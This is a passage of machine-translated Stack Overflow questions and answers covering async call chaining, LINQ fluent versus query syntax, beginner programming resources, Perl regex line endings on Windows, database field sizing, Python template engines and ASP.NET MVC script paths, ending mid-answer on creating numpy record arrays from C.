我们正在使用 GWT RPC，它也有一个异步 API。我们目前用于串行进行多个异步调用的解决方案是调用链：

```
callA(function(resultA) {
    callB(resultA, function(resultB) {
        callC(); //etc.
    });
}); 
```

这种嵌套方法可以实现您想要的，但是对于新手来说它很冗长且难以阅读。我们研究的一种方法是将我们需要进行的调用添加到堆栈并按顺序执行它们：

```
callStack = [
    callA(),
    callB(),
    callC()
];

callStack.execute(); 
```

然后调用堆栈将管理：

1.  串行调用调用（即第一个示例中的接线）
2.  将结果从一个呼叫转发到下一个。

然而，由于 Java 没有函数引用，调用堆栈上的每个调用都需要一个匿名类，所以我们没有这样的解决方案。但是，您可能会在 javascript 中取得更大的成功。

祝你好运！

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-18T11:30:31.800

如果您使用的是 jQuery Ajax：$.ajax()

您可以将 asynch 的属性设置为 false ，然后您将向服务器发出同步 ajax 请求。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2011-01-26T19:04:35.797

我不确定这是否是正确的地方，但我来到这里寻找在 Firefox 中进行同步调用的答案。解决方案是删除 onreadystatechange 回调并直接调用。这就是我发现的，我的解决方案 [与休息服务同步回调](http://www.skill-guru.com/blog/2011/01/26/synchronous-calls-with-rest-service/)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2011-01-10T00:33:47.250

这实际上并没有实现数据库查询的同步操作，但这是我的易于管理的解决方案。基本上使用调用函数作为回调函数，并测试结果参数。如果函数接收到结果，它会解析它们，如果没有，它会将自己作为回调发送到查询方法。

```
 render: function(queryResults){
  if (typeof queryResults != 'undefined'){
   console.log('Query completed!');
   //do what you will with the results (check for query errors here)

  } else {
   console.log('Beginning query...');
   this.db.read(this.render); //db.read is my wrapper method for the sql db, and I'm sending this render method as the callback.
  }
 } 
```

# c# - Fluent 和 Query Expression — 两者相比有什么好处吗？

> ID：214500
> 
> 赞同：263
> 
> 时间：2008-10-18T03:36:49.663
> 
> 标签：c#, linq

LINQ 是自泛型以来对 .NET 的最大改进之一，它为我节省了大量时间和代码行数。然而，流畅的语法对我来说似乎比查询表达式语法更自然。

```
var title = entries.Where(e => e.Approved)
    .OrderBy(e => e.Rating).Select(e => e.Title)
    .FirstOrDefault();

var query = (from e in entries
             where e.Approved
             orderby e.Rating
             select e.Title).FirstOrDefault(); 
```

两者之间有什么区别，或者一个比另一个有什么特别的好处？

* * *

## 回答 #1

> 赞同：264
> 
> 时间：2009-05-05T03:15:07.300

两者都不是更好：它们满足不同的需求。当您想要利用**多个范围变量**时，查询语法就会发挥作用。这发生在三种情况下：

*   使用 let 关键字时
*   当您有多个生成器时（*from*子句）
*   做连接时

这是一个示例（来自 LINQPad 示例）：

```
string[] fullNames = { "Anne Williams", "John Fred Smith", "Sue Green" };

var query =
  from fullName in fullNames
  from name in fullName.Split()
  orderby fullName, name
  select name + " came from " + fullName; 
```

现在将其与方法语法中的相同内容进行比较：

```
var query = fullNames
  .SelectMany (fName => fName.Split().Select (name => new { name, fName } ))
  .OrderBy (x => x.fName)
  .ThenBy  (x => x.name)
  .Select  (x => x.name + " came from " + x.fName); 
```

另一方面，方法语法公开了查询运算符的全部范围，并且对于简单的查询更加简洁。您可以通过混合查询和方法语法来获得两全其美的效果。这通常在 LINQ to SQL 查询中完成：

```
var query =
  from c in db.Customers
  let totalSpend = c.Purchases.Sum (p => p.Price)    // Method syntax here
  where totalSpend > 1000
  from p in c.Purchases
  select new { p.Description, totalSpend, c.Address.State }; 
```

* * *

## 回答 #2

> 赞同：59
> 
> 时间：2008-10-18T05:07:47.640

当我可以这样编写整个表达式时，我更喜欢使用后者（有时称为“查询理解语法”）。

```
var titlesQuery = from e in entries
                  where e.Approved
                  orderby e.Rating
                  select e.Titles;

var title = titlesQuery.FirstOrDefault(); 
```

只要我必须添加（括号）和`.MethodCalls()`，我就会改变。

当我使用前者时，我通常每行放一个子句，如下所示：

```
var title = entries
    .Where (e => e.Approved)
    .OrderBy (e => e.Rating)
    .Select (e => e.Title)
    .FirstOrDefault(); 
```

我发现这更容易阅读。

* * *

## 回答 #3

> 赞同：29
> 
> 时间：2008-10-18T04:55:02.113

每种风格都有其优点和缺点。查询语法在连接方面更好，它具有有用的[let](http://web.archive.org/web/20101105231052/http://spellcoder.com/blogs/bashmohandes/archive/2007/12/16/9212.aspx)关键字，可以轻松在查询中创建临时变量。

另一方面，Fluent 语法具有更多未通过查询语法公开的方法和操作。此外，由于它们只是扩展方法，您可以编写自己的方法。

我发现，每次我开始使用查询语法编写 LINQ 语句时，我最终都不得不将它放在括号中并回退到使用流畅的 LINQ 扩展方法。查询语法本身没有足够的功能来使用。

* * *

## 回答 #4

> 赞同：23
> 
> 时间：2012-01-27T19:57:21.293

在**VB.NET**中，我非常喜欢查询语法。

我讨厌重复丑陋的`Function`关键字：

```
Dim fullNames = { "Anne Williams", "John Fred Smith", "Sue Green" };
Dim query =
     fullNames.SelectMany(Function(fName) fName.Split().
     Select(Function(Name) New With {Name, fName})).
     OrderBy(Function(x) x.fName).
     ThenBy(Function(x) x.Name).
     Select(Function(x) x.Name & " came from " & x.fName) 
```

在我看来，这个简洁的查询更具可读性和可维护性：

```
query = From fullName In fullNames
        From name In fullName.Split()
        Order By fullName, name
        Select name & " came from " & fullName 
```

VB.NET 的查询语法也比 C# 更强大，更简洁：[https ://stackoverflow.com/a/6515130/284240](https://stackoverflow.com/a/6515130/284240)

例如这个 LINQ to DataSet(Objects) 查询

VB.NET：

```
Dim first10Rows = From r In dataTable1 Take 10 
```

C＃：

```
var first10Rows = (from r in dataTable1.AsEnumerable() 
                   select r)
                   .Take(10); 
```

* * *

## 回答 #5

> 赞同：18
> 
> 时间：2009-02-28T06:01:32.163

我根本没有得到查询语法。在我的脑海里没有任何理由。let 可以通过 .Select 和匿名类型来实现。我只是认为那里的“标点符号”看起来更有条理。

* * *

## 回答 #6

> 赞同：13
> 
> 时间：2008-10-18T03:52:46.450

流畅的界面，如果只有一个地方。如果我需要 select 或 orderby，我通常使用 Query 语法。

* * *

## 回答 #7

> 赞同：8
> 
> 时间：2008-10-18T03:42:24.210

流利的语法确实看起来更强大，它也应该更好地将代码组织成小的可重用方法。

* * *

## 回答 #8

> 赞同：5
> 
> 时间：2009-08-11T19:45:26.077

我知道这个问题是用 C# 标记的，但是 VB.NET 的 Fluent 语法非常冗长。

* * *

## 回答 #9

> 赞同：4
> 
> 时间：2008-10-18T03:53:50.037

我真的很喜欢 Fluent 语法，我会尽可能地使用它，但在某些情况下，例如在我使用连接的地方，我通常更喜欢 Query 语法，在这些情况下我发现它更容易阅读，而且我认为有些人比 lambdas 更熟悉 Query（类 SQL）语法。

* * *

## 回答 #10

> 赞同：4
> 
> 时间：2008-10-18T04:19:43.820

虽然我确实理解并喜欢 fluent format ，但出于可读性原因，我暂时坚持使用 Query 。刚接触 LINQ 的人会发现 Query 读起来更舒服。

* * *

## 回答 #11

> 赞同：4
> 
> 时间：2008-10-19T05:21:06.080

我更喜欢查询语法，因为我来自使用 SQL 的传统 Web 编程。对我来说，把头绕起来要容易得多。但是，它认为我将开始使用 .Where(lambda) 因为它肯定要短得多。

* * *

## 回答 #12

> 赞同：4
> 
> 时间：2009-03-06T21:33:50.843

我已经使用 Linq 大约 6 个月了。当我第一次开始使用它时，我更喜欢查询语法，因为它与 T-SQL 非常相似。

但是，我现在逐渐转向前者，因为将可重用的代码块编写为扩展方法并将它们链接在一起很容易。尽管我确实发现将每个子句放在自己的行上有助于提高可读性。

* * *

## 回答 #13

> 赞同：3
> 
> 时间：2010-12-01T07:25:13.690

我刚刚建立了我们公司的标准，我们强制使用扩展方法。我认为选择其中一个而不是在代码中混淆它们是个好主意。扩展方法读起来更像其他代码。

理解语法没有所有运算符，并且在查询周围使用括号并添加扩展方法毕竟只是乞求我从一开始就使用扩展方法。

但在大多数情况下，这只是个人喜好，也有少数例外。

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2021-04-04T16:08:27.890

来自微软的文档：

> 作为一个规则，当您编写 LINQ 查询时，**我们建议您尽可能使用查询语法，并在必要时使用方法语法**。两种不同形式之间没有语义或性能差异。查询表达式通常比用方法语法编写的等效表达式更具可读性。

[https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/linq/#query-expression-overview](https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/linq/#query-expression-overview)

他们还说：

> 要开始使用 LINQ，您不必广泛使用 lambda。**但是，某些查询只能用方法语法表示，其中一些需要 lambda 表达式**。

[https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/linq/query-syntax-and-method-syntax-in-linq](https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/linq/query-syntax-and-method-syntax-in-linq)

# php - 一般的编程知识？

> ID：214513
> 
> 赞同：10
> 
> 时间：2008-10-18T03:44:32.177
> 
> 标签：php

我对编程完全陌生 - 我的兴趣在于 PHP 和 MySql 用于构建用于军乐队管理的动态 Web 应用程序。即会员的一般信息和社交网络+管理团队有效沟通的附加功能。

好的，所以问题-当我更多地了解PHP时，使用了一些我不明白的术语，这些术语必须来自所有语言之间熟悉的共同基础，即“堆栈溢出”似乎是一个明显的问题-“使用太多递归函数可能会破坏堆栈”是另一个。

那么有没有一本关于一般编程的书（也许是一本入门书）可以让像我这样的人更好地理解这一切意味着什么？

请记住，我今年 57 岁（年轻），而且才刚刚起步。

史蒂夫

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-10-18T03:55:41.203

[Wikipedia](http://www.wikipedia.org/)可能是您获取有关编程术语的一般信息的最佳资源。他们社区的很大一部分与编程社区重叠，因此与技术相关的页面通常非常准确、具有教育意义并且是最新的。请参阅他们关于[堆栈溢出](http://en.wikipedia.org/wiki/Stack_overflow)和[递归](http://en.wikipedia.org/wiki/Recursion_(computer_science))的页面作为示例。

此外，PHP.net 是专门学习 PHP 的最佳场所，但如果您刚刚开始，请跳过主页[直接进入教程。](http://us2.php.net/tut.php)

最后，我强烈推荐《[Head First SQL](http://headfirstlabs.com/books/hfsql/) 》这本书来学习数据库。本书中的所有示例都使用 MySQL。整个 Head First 系列都很棒。我听说他们也有一本 PHP 书，但我还没有读过那本书。

更新：[Head First PHP & MySQL](http://www.amazon.ca/Head-First-MySQL-Lynn-Beighley/dp/0596006306)现已推出。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-10-18T05:56:50.023

听起来您缺少计算机科学程序中涵盖的一些基础知识。不用担心，信息很容易获得。您不必花钱请人教它（尽管有时很好）。维基百科的[计算机科学](http://en.wikipedia.org/wiki/Computer_science)条目对于突出您可能遇到的主要领域来说还不错。值得了解的主题：

*   离散数学（有助于理解形式逻辑、算法复杂性、概率）
*   编程基础（听起来你可能有一个好的开始）
*   数据结构（以适合任务的方式存储和操作数据。例如，为什么要使用哈希表、数组和链表？从您的列表来看，stackoverflow 中的堆栈是一种数据结构。）
*   算法（以最有效的方式操作您的数据结构，或者至少知道成本。从您的列表中，使用太多递归函数来“粉碎堆栈”是一种算法选择。）
*   计算机体系结构（了解代码在编译或解释后实际发生的情况。）
*   网络（学习协议，当您的软件想要与未运行的机器通信时会发生什么）
*   比较编程语言（PHP 只是给猫剥皮的一种方法。了解为什么它的设计者会做出他们所做的决定并接触替代方案。）
*   操作系统（了解硬件如何与您的软件交互很好，但了解它如何与其操作系统交互可能更重要。文件系统、进程管理、内存管理、安全性）
*   形式语言/计算理论（计算模型、语法[用于验证和解释代码]、计算限制。通常不会作为软件工程师每天使用。再说一次，在这门课之后，正则表达式终于有意义了。）
*   软件设计和生命周期方法（在设计、编码、测试、发布和维护软件时要慎重。）

就书籍而言，我首先会检查值得信赖的学校的计算机科学课程阅读。

斯坦福免费提供一系列在线课程：http: [//see.stanford.edu/see/courses.aspx](http://see.stanford.edu/see/courses.aspx)

麻省理工学院让你免费下载课程资料：http: [//ocw.mit.edu/OcwWeb/Electrical-Engineering-and-Computer-Science/](http://ocw.mit.edu/OcwWeb/Electrical-Engineering-and-Computer-Science/)

查看[youtube](http://youtube.com)上与计算机科学相关的讲座。

如果您想要一些不那么以学校为重点的东西，在亚马逊上快速搜索上述任何主题将为您提供带有用户评论的结果。

显然，综合起来，这个列表并不是真正的介绍。我会从一个听起来很有趣的话题开始，然后跳进去。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-18T03:55:36.617

好吧，这不是关于 PHP 的书，但我认为[Pragmatic Bookshelf中的](http://www.pragprog.com)[“学习编程”](http://www.pragprog.com/titles/fr_ltp/learn-to-program)之类的书 可能对您遇到的情况有用。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-18T03:54:16.260

为了以非常易读（不太技术化）的方式更好地理解计算机硬件和软件的内部工作原理，我可以推荐Charles Petzold[的 Code, The Hidden Language of Computer Hardware and Software](http://www.charlespetzold.com/code)。

后面的章节特别讨论了大多数编程语言中存在的一些更通用的编程概念。前面的章节更多地关注计算机和软件的历史，因此与您的问题无关。

然而，它不是一本大书，所以无论如何阅读它都应该是有趣/有用的。

如果您正在寻找专门介绍 PHP/MySQL 编程的书籍，那么有更好的书籍，但是如果您想了解更多关于软件和硬件如何工作的一般知识，那么 Code 很棒。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-19T12:15:05.183

学习是非常个人化的，所以你的里程可能会有所不同，但我发现在公共论坛上提问非常有帮助。如果你不了解很多主题，很容易提出错误的问题，或者以某种方式专注于错误的事情。从更有经验的人那里获得直接反馈通常会对此有所帮助。PHP 很幸运，因为它拥有一个非常庞大且友好的社区。此外，它的许多用户都是业余爱好者或缺乏经验的程序员，这意味着存在一种询问有关术语等基本问题的文化。我建议你利用这个来源。

一个开始的地方可能是[站点](http://www.sitepoint.com/forums/forumdisplay.php?f=34)点，但还有其他地方

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-18T04:28:36.907

我不确定是否有一本书会教你“编程基础”。我知道学习所有这些东西的唯一方法就是**练习**。获取 PHP 教程并开始构建东西。始终保持开放的心态去学习新事物。当您找到一种比可能非常低效的黑客更好的方法时，您将不完整的知识组合在一起，然后使用它并学习它并将其整合到您的知识中......经过几年的时间，您将成为黄金。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-18T06:19:14.890

自从我阅读它以来已经有几年了，但是[Programming PHP](https://rads.stackoverflow.com/amzn/click/com/0596006810)在介绍基本编程概念方面做得很好。它对帮助理解更高级的概念没有太大帮助，比如 MVC（这在 PHP 世界中很少见），它包括[数组](http://en.wikipedia.org/wiki/Arrays)、[函数](http://en.wikipedia.org/wiki/Function_(computer_science))、[回调](http://en.wikipedia.org/wiki/Callback_(computer_science))、[类](http://en.wikipedia.org/wiki/Object-oriented_programming)等。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-10-18T06:26:46.793

我喜欢 Corbin 的评论，但我会采取相反的方法。

基本上，对于今天的系统，您真的不需要了解系统的所有底层细节。真的，你没有。

如果你觉得这些东西很有趣，整个互联网都任你支配——只需让你内心的缪斯引导你完成必要性或简单的好奇心。你可以随心所欲地走深或高。

事实是，今天的计算简直太棒了，以至于你想要着手的项目只是一个了解更多关于神秘计算世界的绝好机会。人们可以“毫无头绪”地尽其所能，这一事实证明了该领域已经取得了多大的进步。这是一件好事。

了解坚果汤的过程是一件好事吗？当然。你真的需要这种理解来提高生产力并从你的时间投资中获得有用的结果吗？不，你没有。

而且，随着你的进步，如果你真的喜欢这项工作（你可能不喜欢），那么这个领域就会变得随心所欲。

今天的计算就像“家得宝”。你可以做到，我们可以提供帮助。有数百个论坛和数千页的文档、书籍、博客和讨论可用于大多数主题。

要关注的关键是简单地完成您的任务。不要担心让它变得完美，不要担心“以正确的方式做”，不要“设计”它。只需将部分拼凑在一起，直到您使用碰巧找到或凭直觉得到的东西接近于您想要完成的事情。因为这是找出你不知道的东西以及如何在你的应用程序中不做事情的最简单方法。试试看。

你会被选项、技术、模式、框架等所蒙蔽。不仅有“不止一种方法”，还有数百种“方法”。忽略数百个，专注于“做”，但对你来说似乎很自然。

并且不要让雅虎在他们的象牙塔中对您提出问题，或者撕碎您的设计。除非他们的名字是“巴贝奇”，或者他们在二战中为炮兵计算机切割齿轮，否则我们都站在巨人的肩膀上，我们都从某个地方开始。诚实的批评应该永远受到欢迎，但有些人似乎无法提供这一点，而是诉诸贬低。

我惊叹于我所见过的“被黑”、“被屠杀”和“OMG'd”的应用程序，人们从中获得了真正的实际用途——这就是游戏的真正名称。

祝你好运。在你所有的努力中取得成功。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2015-08-30T10:28:23.700

如果您更像是视觉学习者，我会查看一些视频教程。从基本的编程概念等开始，然后升级到 Up and Running with PHP 和 Advanced PHP and MySQL 等标题。然后我会建议一个像codeigniter这样的MVC框架。

您可以在 Lynda.com 或 Pluralsight.com 以及其他几个地方找到很棒的视频教程。

# windows - Perl 的 /m 正则表达式修饰符在 Windows 上的匹配是否不同？

> ID：214517
> 
> 赞同：5
> 
> 时间：2008-10-18T03:47:36.337
> 
> 标签：windows, regex, perl, multiline

以下 Perl 语句在 Unixish 机器上的行为相同。它们在 Windows 上的行为是否不同？如果是，是不是因为魔法\n？

```
 split m/\015\012/ms, $http_msg;
  split m/\015\012/s, $http_msg; 
```

我的一个 CPAN 模块在 Win32 烟雾测试仪上出现[故障。](http://www.nntp.perl.org/group/perl.cpan.testers/2008/10/msg2450019.html)看起来这是一个 \r\n vs \n 问题。我最近所做的一项更改是将 //m 添加到我的正则表达式中。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2008-10-18T09:13:12.467

对于这些正则表达式：

> ```
> m/\015\012/ms
> m/\015\012/s 
> ```

/m 和 /s 都没有意义。

*   /s：也`.`匹配`\n`。您的正则表达式不包含`.`
*   /m：在字符串中嵌入`^`和`$`匹配旁边。`\n`您的正则表达式不包含 no`^`或`$`它们的同义词。

如果您的输入句柄（套接字？）在文本模式下工作，那么确实有可能，`\r`（`\015`）字符将在 Windows 上被删除。

那么该怎么办？我建议使`\015`字符可选，并分开

```
/\015?\012/ 
```

不需要 /m、/s 甚至前导`m//`. 那些只是货物崇拜。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-18T18:06:38.737

没有魔法`\n`。两者`\n`和`\r`总是意味着一个字符，并且在所有基于 ASCII 的平台上分别是`\cJ`和`\cM`。（例外是 EBCDIC 平台（出于显而易见的原因）和 MacOS Classic（其中`\n`和`\r`两者均表示`\cM`）。）

在 Windows 上发生的神奇之处在于，当通过标记为处于文本模式的文件句柄执行 I/O 时，在读取时`\r\n`被转换为`\n`，在写入时反之亦然。（此外，`\cZ`它的意思是文件结束——令人惊讶！）这是在 C 运行时库层完成的。

**你需要[`binmode`](http://p3rl.org/binmode)你的插座来解决这个问题。**

您还应该从您的模式中删除`/s`and`/m`修饰符：因为您不使用它们修改其行为的元字符（`.`和`^`/`$`对，分别），它们什么都不做 - 货物崇拜。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-18T16:47:48.973

你为什么加`/m`？你是想在网上分手吗？为此，`/m`您需要使用正则表达式`^`或`$`在正则表达式中：

```
my @lines = split /^/m, $big_string; 
```

但是，如果您想将大字符串视为行，只需打开对标量的引用的文件句柄：

```
open my $string_fh, '<', \ $big_string;
while( <$string_fh> ) {
    ... process a line
    } 
```

# sql - 在我的数据库中使用 2 的幂作为字段大小是否有任何性能原因？

> ID：214527
> 
> 赞同：1
> 
> 时间：2008-10-18T03:53:00.787
> 
> 标签：sql, database, optimization

很久以前，当我还是个年轻人的时候，我曾经做过很多汇编和优化编程。今天我主要发现自己在构建 Web 应用程序（也可以......）。但是，每当我为数据库表创建字段时，我发现自己使用 16、32 和 128 之类的值作为文本字段，并尝试将布尔值组合到 SET 数据字段中。

从长远来看，给文本字段的长度为 9 是否会使我的数据库变慢，我是否真的通过指定更容易内存对齐的字段长度来帮助它？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-10-18T04:00:27.840

数据库优化与机器代码优化完全不同。对于数据库，大多数时候您希望减少磁盘 I/O，而浪费性地尝试对齐字段只会使更少的记录适合磁盘块/页面。此外，如果任何对齐是有益的，数据库引擎会自动为您完成。

最重要的是索引以及您如何使用它们。尝试在更小的空间中打包更多信息的技巧很容易最终使拥有良好索引变得更加困难。（不过，不要过度；索引不仅会减慢索引列的 INSERT 和 UPDATE 速度，而且还意味着规划者需要做更多的工作，规划者必须考虑所有的可能性。）

大多数数据库都有一个 EXPLAIN 命令；尝试在您的选择中使用它（特别是那些具有多个表的选择），以了解数据库引擎将如何工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-18T06:31:23.307

字段本身的大小可能很重要，但通常对于使用 nvarchar 或 varchar 的文本来说，这没什么大不了的。因为数据库会占用你使用的东西。以下将对您的 SQL 速度产生更大的影响：

没有比你需要的更多的列。就列而言，更大的表意味着数据库不太可能在同一磁盘页面上找到您的查询结果。请注意，即使您只要求选择 10 列中的 2 列，这也是正确的...（有一种方法可以解决这个问题，使用聚集索引，但只能解决一种有限的情况）。

您应该提供更多关于您正在考虑获得更多提示的设计问题/替代方案类型的详细信息。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-21T17:26:40.550

上面隐含的东西，但可以明确表示。您无法知道计算机实际在做什么。这不像过去那样，您可以查看汇编程序并清楚地知道程序将要执行的步骤。一个“看起来”像在 CPU 寄存器中的值实际上可能必须从芯片上的缓存甚至磁盘中获取。如果您不是在编写汇编程序，而是使用优化编译器，或者更确切地说，是运行时引擎（Java、C#）上的字节码，请放弃希望。或者放弃忧虑，这是更好的主意。

写入或检索该数据库值可能需要数千甚至数万个机器周期。不必担心由于全字对齐而导致的 10 个额外循环。

# python - 网页设计师的 Python 模板

> ID：214536
> 
> 赞同：5
> 
> 时间：2008-10-18T03:56:06.787
> 
> 标签：python, templating

网页设计师有哪些好的模板引擎？作为程序员，我绝对有自己的偏好。但是网页设计师似乎对事物有不同的思考方式，因此可能更喜欢不同的系统。

所以：

*   网页设计师：您更喜欢使用什么模板引擎？
*   程序员：你使用过哪些模板引擎让与网页设计师的合作变得容易？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-10-18T06:14:36.710

[Django 的模板引擎](http://docs.djangoproject.com/en/dev/topics/templates/#topics-templates)相当不错。它非常坚固，同时不会踩到太多脚趾。如果您正在使用 Python，我会推荐它。我不知道如何将它与 Django 分开，但我怀疑这将是非常困难的，因为 Django 是非常模块化的。

**编辑：** 显然，[独立使用 Django 模板引擎的迷你指南](http://docs.djangoproject.com/en/dev/ref/templates/api/#configuring-the-template-system-in-standalone-mode)已经摆在我面前，谢谢[insin](https://stackoverflow.com/users/6760/insin)。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-10-18T12:00:40.507

[在回答同一个问题的重复](https://stackoverflow.com/questions/98245/what-is-your-single-favorite-python-templating-engine#98285)时，我得到了很好的选票。

我的回答是：

[金贾2](http://jinja.pocoo.org/2 "Jinja2 主页") .

良好的[语法](http://jinja.pocoo.org/2/documentation/templates "模板语法文档")，良好的[定制可能性](http://jinja.pocoo.org/2/documentation/extensions.html "扩展 Jinja2")。

整合得很好。可以被沙盒化，因此您不必完全信任您的模板作者。（马可不能）。

它也非常快，并且可以将模板编译为字节码并对其进行缓存，如下面的演示所示：

```
>>> import jinja2
>>> print jinja2.Environment().compile('{% for row in data %}{{ row.name | upper }}{% endfor %}', raw=True) 
from __future__ import division
from jinja2.runtime import LoopContext, Context, TemplateReference, Macro, Markup, TemplateRuntimeError, missing, concat, escape, markup_join, unicode_join
name = None

def root(context, environment=environment):
    l_data = context.resolve('data')
    t_1 = environment.filters['upper']
    if 0: yield None
    for l_row in l_data:
        if 0: yield None
        yield unicode(t_1(environment.getattr(l_row, 'name')))

blocks = {}
debug_info = '1=9' 
```

这段代码是由 Jinja2 动态生成的。当然，编译器会进一步优化它（例如删除`if 0: yield None`）

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2008-10-18T11:35:15.113

看看[马可](http://www.makotemplates.org/)。

以下是我与网页设计师打交道的方式。

1.  让他们模拟页面。在 HTML 中。
2.  使用 HTML 作为模板的基础，用替换替换模拟的内容`${...}`。
3.  折叠循环以处理重复。

if 语句的使用需要协商，因为模型是页面的一个版本，并且对于某些材料的条件呈现通常有一些解释。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-18T06:14:20.673

我个人发现[Cheetah 模板](http://www.cheetahtemplate.org/)对设计师非常友好。需要一些时间的是模板子类化的想法，而这在一开始是很难得到的。但是设计师创建了一个完整的模板，复制了他的代码......然后你可以去清理一下。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-10-18T17:24:16.293

添加到@Jaime Soriano 的评论中，Genshi[是](http://genshi.edgewall.org/)Trac 0.11 后使用的模板引擎。它可以用作通用模板解决方案，但侧重于 HTML/XHTML。它具有自动转义以减少 XSS 漏洞。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-10-18T12:25:04.107

Mi 投票给[Clearsilver](http://www.clearsilver.net/)，它是 Trac 0.11 之前使用的模板引擎，它也用于 Google Groups 或 Orkut 等页面。此模板引擎的主要优点是速度非常快且与语言无关。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-10-18T23:16:03.977

我扮演过这两个角色，而且我更喜欢程序员的模板语言。然而，我为一些从事“繁重”支持和数据库编程的平面设计师做自由职业者，我可以告诉你，我在 XML 模板语言（SimpleTAL、Genshi 等）方面遇到了最好的运气。

当我试图对网页设计师友好时，我会寻找可以加载到 Dreamweaver 中并查看结果的东西。这允许我提供模板中的所有钩子，并让设计人员对其进行调整，而不必担心破坏我已经编写的内容。它允许我们共享代码并在我们都对格式感到满意的情况下更好地合作。

如果没有所见即所得编辑器的设计器编码，我认为您的选择较少，您可以选择自己喜欢的。

# jquery - ASP.net MVC 和 jQueryUI 的困境

> ID：214537
> 
> 赞同：6
> 
> 时间：2008-10-18T03:56:15.100
> 
> 标签：jquery, asp.net-mvc, jquery-ui, path, jquery-ui-theme

我刚刚将一个项目移到了`ASP.net MVC`框架的 beta 版本，我遇到的唯一问题是`jQuery`和`jQueryUI`.

这是交易：

以下`Site.Master`是脚本参考：

```
<script src="../../Scripts/jquery-1.2.6.js" type="text/javascript"></script>
<script src="../../Scripts/jquery-ui.js" type="text/javascript"></script> 
```

使用这些，`accordian UI`我在其中一个视图上的效果很好，除了一个问题：`ThemeRoller`页面中不包含来自的图像。如果我注释掉 jQuery 引用，那么 ThemeRoller 图像就在那里。所有的 css 都在 中`Content folder`，所有的脚本都在`Scripts folder`.

我知道这是一个愚蠢的路径问题，但它让我抽搐。

我错过了什么？

**更新**

我尝试了第一个答案无济于事，请阅读评论以获取详细信息。再次感谢观看的人。

第二种方法也不起作用。我很困惑。

**另一个更新**

使用脚本的`Url.Content`标签确实可以让脚本正常运行。对样式表使用常规标记会将所有样式添加到页面上，但与 ThemeRoller 相关的所有样式除外。

该`jquery-ui-themeroller.css`文件位于 Content 文件夹中，当我检查一个元素时，css 存在。我怀疑问题出在从这个css文件到themeroller的images文件夹的映射中，该文件夹也在Content文件夹中。此文件中的图像链接指定为：`background: url(images/foo.gif)`

此文件中的链接是否需要更改？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-18T04:16:44.013

除非您的所有视图都处于同一级别，否则您需要使用

*   使用绝对路径，例如 /Scripts/jquery-1.2.6.js
*   或者更好的是，解析一个虚拟路径，例如 <%= Url.Content("~/Scripts/jquery-1.2.6.js") %>

[Url.Content() http://jvance.com/media/2008/10/18/UrlContent5.media](http://jvance.com/media/2008/10/18/UrlContent5.media)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-18T12:54:50.397

这有帮助吗？

[http://forums.asp.net/p/1334947/2690469.aspx](http://forums.asp.net/p/1334947/2690469.aspx)

> 不一致的原因很简单，虽然我承认这并不容易弄清楚！当 <head runat="server"> 中有 <link> 标记时，ASP.NET 将处理 <link> 标记并检测 URL 并相对于应用程序的根进行解析。如果页面上有 <script> 标记（没有 runat="server"），那么 ASP.NET 将不理会它，因为它只是普通的旧 HTML。
> 
> 使用 Url.Content() 是我用来解决这个问题的方法，因为它会相对于应用程序根进行解析，就像 <link> 标记一样。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-18T18:37:00.110

您需要更改 jquery-ui-themeroller.css 中的链接以指向图像的当前位置。

如中，您需要更新 css 文件正在查找的图像的路径。

```
background: url(images/foo.gif) 
```

从路径中删除“图像/”，使其看起来像：

```
background: url(foo.gif) 
```

因为您的 css 和图像都在内容文件夹中。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-17T21:21:03.847

```
 protected void Page_Load(object sender, EventArgs e)
    {
        Page.ClientScript.RegisterClientScriptInclude(this.GetType(),"JQuery", ResolveUrl("~/js/jquery.min.js"));
        Page.ClientScript.RegisterClientScriptInclude(this.GetType(), "JQueryUI", ResolveUrl("~/js/jquery-ui.custom.min.js")); 
```

# python - 如何从 C 创建一个 numpy 记录数组

> ID：214549
> 
> 赞同：9
> 
> 时间：2008-10-18T04:03:35.850
> 
> 标签：python, c, numpy

在 Python 方面，我可以创建新的 numpy 记录数组，如下所示：

```
numpy.zeros((3,), dtype=[('a', 'i4'), ('b', 'U5')]) 
```

我如何在 C 程序中做同样的事情？我想我必须打电话`PyArray_SimpleNewFromDescr(nd, dims, descr)`，但我如何构造一个`PyArray_Descr`适合作为第三个参数传递给的`PyArray_SimpleNewFromDescr`？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2008-10-18T14:19:14.627

使用`PyArray_DescrConverter`. 这是一个例子：

```
#include <Python.h>
#include <stdio.h>
#include <numpy/arrayobject.h>

int main(int argc, char *argv[])
{
